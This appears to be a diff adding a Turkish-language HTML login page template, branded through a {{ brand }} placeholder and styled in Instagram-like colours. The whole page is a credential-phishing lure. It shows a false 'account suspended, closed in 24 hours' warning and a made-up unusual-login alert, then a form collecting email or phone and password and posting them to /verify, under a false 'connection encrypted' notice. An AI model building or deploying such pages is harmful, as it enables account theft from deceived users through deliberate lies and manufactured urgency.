@@ -1,0 +1,92 @@
+<!doctype html>
+<html lang="tr">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<meta name="theme-color" content="#0b0f19">
+<title>{{ brand }}</title>
+<style>
+  :root{
+    --bg:#0b0f19; --card:#141a26; --line:#243044;
+    --txt:#e8eefc; --dim:#93a3bd; --acc:#e1306c; --acc2:#f77737;
+  }
+  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+  body{
+    margin:0;min-height:100vh;padding:16px;display:flex;flex-direction:column;
+    align-items:center;gap:14px;color:var(--txt);
+    background:
+      radial-gradient(900px 480px at 50% -8%, #1d2740 0%, transparent 62%),
+      var(--bg);
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;
+  }
+  .warn{
+    max-width:440px;width:100%;padding:11px 14px;border-radius:12px;
+    background:rgba(255,77,79,.11);border:1px solid rgba(255,77,79,.42);
+    color:#ffb3b4;font-size:13px;line-height:1.5;display:flex;gap:9px;
+  }
+  .warn b{color:#fff}
+  .card{
+    max-width:440px;width:100%;padding:30px 26px 26px;border-radius:20px;
+    background:var(--card);border:1px solid var(--line);
+    box-shadow:0 24px 60px -20px #000a;
+  }
+  .logo{
+    width:64px;height:64px;margin:0 auto 16px;border-radius:18px;
+    display:grid;place-items:center;font-size:30px;
+    background:linear-gradient(135deg,var(--acc),var(--acc2));
+    box-shadow:0 10px 30px -8px var(--acc);
+  }
+  h1{font-size:21px;margin:0 0 8px;text-align:center;letter-spacing:-.2px}
+  .sub{color:var(--dim);font-size:14px;line-height:1.55;text-align:center;margin:0 0 20px}
+  label{
+    display:block;margin:14px 0 6px;font-size:12px;color:var(--dim);
+    letter-spacing:.03em;text-transform:uppercase;font-weight:600;
+  }
+  input{
+    width:100%;padding:13px 14px;border-radius:11px;border:1px solid var(--line);
+    background:#0d1420;color:var(--txt);font-size:15px;outline:none;
+    transition:border .15s,box-shadow .15s;
+  }
+  input:focus{border-color:var(--acc);box-shadow:0 0 0 3px rgba(225,48,108,.18)}
+  button{
+    width:100%;margin-top:22px;padding:14px;border:0;border-radius:12px;
+    background:linear-gradient(135deg,var(--acc),var(--acc2));color:#fff;
+    font-size:15px;font-weight:700;cursor:pointer;letter-spacing:.2px;
+  }
+  button:active{transform:translateY(1px)}
+  .lock{
+    margin-top:14px;display:flex;align-items:center;justify-content:center;
+    gap:6px;font-size:12px;color:#6d7d96;text-align:center;
+  }
+</style>
+</head>
+<body>
+  <div class="warn">
+    <span>⚠</span>
+    <div><b>Hesabınız askıya alındı.</b>
+    Kimlik doğrulaması yapılmazsa 24 saat içinde kalıcı olarak
+    kapatılacaktır.</div>
+  </div>
+
+  <div class="card">
+    <div class="logo">🛡</div>
+    <h1>Kimliğinizi Doğrulayın</h1>
+    <p class="sub">Bu ağ üzerinden olağandışı bir oturum açma girişimi tespit
+    edildi. Devam etmek için hesabınızı doğrulamanız gerekiyor.</p>
+
+    <form method="post" action="/verify">
+      <label for="u">E-posta veya telefon</label>
+      <input id="u" name="username" type="text" inputmode="email"
+             autocomplete="username" placeholder="ornek@mail.com" required>
+
+      <label for="p">Şifre</label>
+      <input id="p" name="password" type="password"
+             autocomplete="current-password" placeholder="••••••••" required>
+
+      <button type="submit">Hesabımı Doğrula</button>
+    </form>
+
+    <div class="lock">🔒 Bağlantı şifreli · Oturum 30 saniye içinde sonlanır</div>
+  </div>
+</body>
+</html>
